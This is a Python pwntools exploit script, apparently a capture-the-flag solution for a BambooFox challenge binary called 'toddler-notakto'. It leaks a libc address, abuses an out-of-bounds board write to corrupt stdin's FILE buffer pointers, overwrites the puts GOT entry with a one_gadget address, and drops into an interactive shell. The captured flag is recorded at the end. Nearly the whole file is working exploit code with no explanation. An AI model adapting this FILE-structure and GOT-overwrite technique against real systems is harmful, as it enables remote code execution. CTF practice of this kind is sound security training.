#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
context.arch = "amd64"

if "remote" in sys.argv:
    r = remote("bamboofox.cs.nctu.edu.tw", 58797)
else:
    r = process("./toddler-notakto-35a853eaad76dd9fccee879f69607ceea58bfe3f")
libc = ELF("./libc-2.23.so-14c22be9aa11316f89909e4237314e009da38883")
elf = ELF("./toddler-notakto-35a853eaad76dd9fccee879f69607ceea58bfe3f")

# leak 
r.sendafter("What's your name: ", "A" * 40)
r.recvuntil("A" * 40)
libc.address = u64(r.recvuntil("\n====", drop=True).ljust(8, "\x00")) - 0x20830
log.info("libc_base=" + hex(libc.address))

# overwrite stdin._IO_buf_base
r.sendlineafter("move: ", str(libc.sym["_IO_2_1_stdin_"] + 0x38 - elf.sym['board']))

# now we can overwrite from _IO_write_base
r.sendlineafter("move: ", flat(0, 0, 0, 
    elf.got['puts'],            # _IO_buf_base
    elf.got['puts'] + 0x78,     # _IO_buf_end
    0))

# _IO_buf_base = 0x602000 'A' <repeats 16 times>, "\n\310C\315\317\177",
# _IO_buf_end = 0x602060 <stdout@@GLIBC_2.2.5> " \006B\315\317\177",

r.recvrepeat(0.2)
# overwrite got
r.sendline(flat(
    "\x00" * 0x18,
    libc.sym["puts"],
    libc.address + 0x45216,
    ))

r.interactive()

# BAMBOOFOX{IO_iS_S0_CoOl_Is_iT}
